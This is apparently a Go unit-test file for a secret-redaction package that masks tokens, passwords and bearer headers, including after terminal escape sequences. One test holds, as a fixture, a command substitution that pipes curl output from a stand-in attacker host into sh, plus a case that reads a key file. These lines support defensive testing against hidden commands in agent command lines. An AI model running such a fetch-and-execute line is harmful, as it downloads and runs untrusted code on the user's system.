package redact

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestSecretsPatterns(t *testing.T) {
	for input, want := range map[string]string{
		"A=1 ls":                         "A=1 ls", // benign assignment untouched
		"MY_TOKEN=abc ls":                "MY_TOKEN=[REDACTED] ls",
		"--password=x --port 5432":       "--password=[REDACTED] --port 5432",
		"http://u:p@h/x":                 "http://u:[REDACTED]@h/x",
		"Authorization: Bearer tok":      "Authorization: Bearer [REDACTED]",
		"echo add token support to docs": "echo add token support to docs", // prose survives
		// Quoted values are consumed whole, spaces included.
		"--password 'a b c' -h x":  "--password [REDACTED] -h x",
		`PASSWORD="a b c" deploy`:  "PASSWORD=[REDACTED] deploy",
		`--token="multi word" run`: "--token=[REDACTED] run",
		// The shapes secrets take in review comments and patches.
		"hardcodes postgresql://trading:trading123@localhost:5432/db here": "hardcodes postgresql://trading:[REDACTED]@localhost:5432/db here",
		`+DATABASE_PASSWORD="hunter2"`:                                     "+DATABASE_PASSWORD=[REDACTED]",
		// Escaped quotes stay inside the value — the tail must not leak.
		`PASSWORD="ab\"cd" deploy`: "PASSWORD=[REDACTED] deploy",
		// Code and config assignment shapes: spaces, :=, colon keys.
		`API_TOKEN = "abc"`:        "API_TOKEN = [REDACTED]",
		`dbPassword := "hunter2"`:  "dbPassword := [REDACTED]",
		"password: hunter2":        "password: [REDACTED]",
		`"password": "hunter2"`:    `"password": [REDACTED]`,
		"aws_secret_key: AKIA9999": "aws_secret_key: [REDACTED]",
		// Comparisons are not assignments; prose colons stay prose.
		"if password == provided": "if password == provided",
		"auth: needs a refactor":  "auth: needs a refactor",
		// host:port followed by a path with an "@" is not userinfo —
		// the password class stops at "/" (RFC 3986 encodes it there).
		"see https://example.com:8080/mail@host for details": "see https://example.com:8080/mail@host for details",
	} {
		assert.Equal(t, want, Secrets(input), "input: %s", input)
	}
}

// Review finding X2: a bearer token directly after a terminal escape
// stayed visible. The escape ends in a word character, so "\b" finds no
// boundary, and render.Sanitize drops only the ESC byte.
func TestSecretsRedactsBearerAfterTerminalEscape(t *testing.T) {
	for input, want := range map[string]string{
		// The reported input: an SGR color sequence ends in "m".
		"\x1b[31mBearer abc.def-123": "\x1b[31mBearer [REDACTED]",
		// Other CSI shapes: parameters, private marker, other final bytes.
		"\x1b[1;31mBearer tok": "\x1b[1;31mBearer [REDACTED]",
		"\x1b[mBearer tok":     "\x1b[mBearer [REDACTED]",
		"\x1b[2KBearer tok":    "\x1b[2KBearer [REDACTED]",
		"\x1b[?25hBearer tok":  "\x1b[?25hBearer [REDACTED]",
		// The one-character C1 CSI introducer U+009B.
		"\u009b31mBearer tok": "\u009b31mBearer [REDACTED]",
		// Short escapes: reset, save cursor, reverse index, charset select.
		"\x1bcBearer tok":  "\x1bcBearer [REDACTED]",
		"\x1b7Bearer tok":  "\x1b7Bearer [REDACTED]",
		"\x1bMBearer tok":  "\x1bMBearer [REDACTED]",
		"\x1b(BBearer tok": "\x1b(BBearer [REDACTED]",
		// The header shape with a colored keyword.
		"Authorization: \x1b[1mBearer tok": "Authorization: \x1b[1mBearer [REDACTED]",
		// An escape shape that seems to hold the "B" must not hide the
		// token. Both inputs are redacted before the fix too.
		"\x1bBearer tok":  "\x1bBearer [REDACTED]",
		"\x1b[Bearer tok": "\x1b[Bearer [REDACTED]",
		// Prose keeps its word boundary.
		"torchbearer x":        "torchbearer x",
		"\x1b[1mtorchbearer x": "\x1b[1mtorchbearer x",
	} {
		assert.Equal(t, want, Secrets(input), "input: %q", input)
	}
}

// The other patterns already redact after an escape. The assignment
// pattern starts its name at the escape's word characters, and the
// remaining patterns need no word boundary. These cases test that.
func TestSecretsRedactsOtherPatternsAfterTerminalEscape(t *testing.T) {
	for input, want := range map[string]string{
		"\x1b[31mMY_TOKEN=abc":      "\x1b[31mMY_TOKEN=[REDACTED]",
		"\x1bcTOKEN=abc":            "\x1bcTOKEN=[REDACTED]",
		"\x1b[31m--password x":      "\x1b[31m--password [REDACTED]",
		"\x1b[31mpassword: hunter2": "\x1b[31mpassword: [REDACTED]",
		"\x1b[31mhttp://u:p@h/x":    "\x1b[31mhttp://u:[REDACTED]@h/x",
	} {
		assert.Equal(t, want, Secrets(input), "input: %q", input)
	}
}

func TestSecretsExceptMatchesSecretsWhenItKeepsNothing(t *testing.T) {
	never := func(string) bool { return false }

	for _, input := range []string{
		"A=1 ls", "MY_TOKEN=abc ls", "--password=x --port 5432", "http://u:p@h/x", "Authorization: Bearer tok",
		"--password 'a b c' -h x", `PASSWORD="ab\"cd" deploy`, `API_TOKEN = "abc"`, `"password": "hunter2"`,
		"MY_TOKEN=a OTHER_SECRET=b --token c", "\x1b[31mBearer abc.def-123", "",
	} {
		assert.Equal(t, Secrets(input), SecretsExcept(input, never), "input: %s", input)
	}
}

// Security review (Phase C): a display of an agent command line hid a
// command substitution behind [REDACTED], and the command runs it.
func TestSecretsExceptKeepsTheMatchesThatKeepSelects(t *testing.T) {
	shell := func(m string) bool { return strings.Contains(m, "$(") }

	assert.Equal(t, `sh -c MY_TOKEN="$(curl -s https://evil.example/x | sh)" claude -p --token [REDACTED]`,
		SecretsExcept(`sh -c MY_TOKEN="$(curl -s https://evil.example/x | sh)" claude -p --token abc`, shell))
	assert.Equal(t, `--token "$(cat key)" API_KEY=[REDACTED]`,
		SecretsExcept(`--token "$(cat key)" API_KEY=plain`, shell))
}

// Review finding X2-R1: the bearer match can start at a terminal escape,
// and keep received the escape bytes. A keep that looks for shell bytes
// then kept a token after "\x1b>" or "\x1b[1;31m". The keep below stands
// in for tui.shellActive, which this leaf package cannot import.
func TestSecretsExceptGivesKeepTheTextAfterTheEscape(t *testing.T) {
	shellLike := func(m string) bool { return strings.ContainsAny(m, ";<>`") }

	for input, want := range map[string]string{
		// Escapes whose bytes hold ";", "<", ">" or "`".
		"\x1b>Bearer tok":       "\x1b>Bearer [REDACTED]",
		"\x1b<Bearer tok":       "\x1b<Bearer [REDACTED]",
		"\x1b[5`Bearer tok":     "\x1b[5`Bearer [REDACTED]",
		"\x1b[1;5~Bearer tok":   "\x1b[1;5~Bearer [REDACTED]",
		"\x1b[>0;1@Bearer tok":  "\x1b[>0;1@Bearer [REDACTED]",
		"\x1b[1;31mBearer tok":  "\x1b[1;31mBearer [REDACTED]",
		"\u009b1;31mBearer tok": "\u009b1;31mBearer [REDACTED]",
		// A token that holds shell syntax stays visible, with or without
		// an escape before it.
		"\x1b[1mBearer a;b": "\x1b[1mBearer a;b",
		"Bearer a;b":        "Bearer a;b",
	} {
		assert.Equal(t, want, SecretsExcept(input, shellLike), "input: %q", input)
	}

	var got []string

	record := func(m string) bool {
		got = append(got, m)

		return false
	}

	assert.Equal(t, "\x1b[1;31mBearer [REDACTED]", SecretsExcept("\x1b[1;31mBearer tok", record))
	assert.Equal(t, []string{"Bearer tok"}, got, "keep must not see the escape bytes")
}
